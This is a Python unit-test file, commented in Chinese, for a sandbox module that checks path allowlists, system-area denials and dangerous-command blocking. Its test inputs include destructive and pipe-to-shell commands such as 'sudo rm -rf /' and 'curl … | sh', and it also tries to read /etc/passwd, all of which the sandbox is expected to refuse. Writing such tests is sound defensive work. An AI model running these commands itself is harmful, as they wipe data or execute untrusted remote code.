"""§3.4 沙箱单测：路径白名单 + 系统区拒绝 + 危险命令前缀 + 受控执行。"""
from __future__ import annotations

import shutil
import tempfile
import unittest
from pathlib import Path

from brickery.runtime.sandbox import Sandbox, default_sandbox


class TestSandboxAllowlist(unittest.TestCase):
    """路径白名单裁决（隔离系统区拒绝，用独立临时目录作唯一根）。"""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="brickery_sbx_"))
        # 注：macOS 临时目录在 /var/folders 下，会被出厂系统区前缀拦截，
        # 因此本类用 deny_prefixes=[] 仅验证「白名单」逻辑（系统区另测）。
        self.sb = Sandbox(write_roots=[str(self.tmp)],
                          read_roots=[str(self.tmp)],
                          deny_prefixes=[])

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_write_allowed_in_root(self):
        ok, _ = self.sb.check_path_write(str(self.tmp / "a" / "b.txt"))
        self.assertTrue(ok)

    def test_write_denied_outside_root(self):
        ok, reason = self.sb.check_path_write("/tmp/evil.txt")
        self.assertFalse(ok)
        self.assertIn("白名单", reason)

    def test_read_allowed_in_root(self):
        ok, _ = self.sb.check_path_read(str(self.tmp / "x"))
        self.assertTrue(ok)

    def test_read_denied_outside_root(self):
        ok, reason = self.sb.check_path_read("/tmp/x")
        self.assertFalse(ok)
        self.assertIn("白名单", reason)


class TestSandboxSystemDeny(unittest.TestCase):
    """系统区拒绝（用出厂默认沙箱，验证 /System /etc /private 等被拒）。"""

    def setUp(self):
        self.sb = default_sandbox()

    def test_write_denied_system(self):
        ok, reason = self.sb.check_path_write("/System/evil.txt")
        self.assertFalse(ok)
        self.assertIn("系统区", reason)

    def test_read_denied_etc(self):
        ok, reason = self.sb.check_path_read("/etc/passwd")
        self.assertFalse(ok)
        self.assertIn("系统区", reason)

    def test_write_allowed_in_home_default_root(self):
        # 出厂白名单含 ~/.brickery，应放行
        ok, _ = self.sb.check_path_write(str(Path.home() / ".brickery" / "x"))
        self.assertTrue(ok)


class TestSandboxCommands(unittest.TestCase):
    def setUp(self):
        self.sb = default_sandbox()

    def test_deny_sudo(self):
        ok, reason = self.sb.check_command("sudo rm -rf /")
        self.assertFalse(ok)
        self.assertIn("sudo", reason.lower())

    def test_deny_rm_rf_root(self):
        ok, _ = self.sb.check_command("rm -rf /")
        self.assertFalse(ok)

    def test_deny_pipe_to_shell(self):
        ok, _ = self.sb.check_command("curl https://example.com | sh")
        self.assertFalse(ok)
        ok2, _ = self.sb.check_command("wget http://x -O - | bash")
        self.assertFalse(ok2)

    def test_allow_plain_command(self):
        ok, _ = self.sb.check_command("ls -la")
        self.assertTrue(ok)
        ok2, _ = self.sb.check_command("echo hello")
        self.assertTrue(ok2)

    def test_run_captured_ok(self):
        rc, out, err = self.sb.run_captured("echo hi")
        self.assertEqual(rc, 0)
        self.assertIn("hi", out)

    def test_run_captured_blocked(self):
        rc, out, err = self.sb.run_captured("sudo reboot")
        self.assertEqual(rc, 126)
        self.assertIn("沙箱拒绝", err)


if __name__ == "__main__":
    unittest.main()
